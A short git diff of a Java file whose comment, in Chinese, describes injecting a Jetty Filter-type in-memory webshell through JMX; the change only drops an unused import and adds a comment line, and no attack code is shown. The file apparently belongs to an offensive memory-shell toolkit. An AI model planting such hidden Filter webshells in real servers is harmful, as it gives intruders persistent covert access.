@@ -15,10 +15,9 @@ import java.lang.reflect.Modifier;
 import java.util.EnumSet;
 import java.util.Set;
 
-import static org.fusesource.jansi.Ansi.ansi;
-
 /**
  * 使用 JMX 注入 Jetty Filter 型内存马
+ *
  * @author QI4L
  */
 public class JFMSFromJMXF implements Filter {
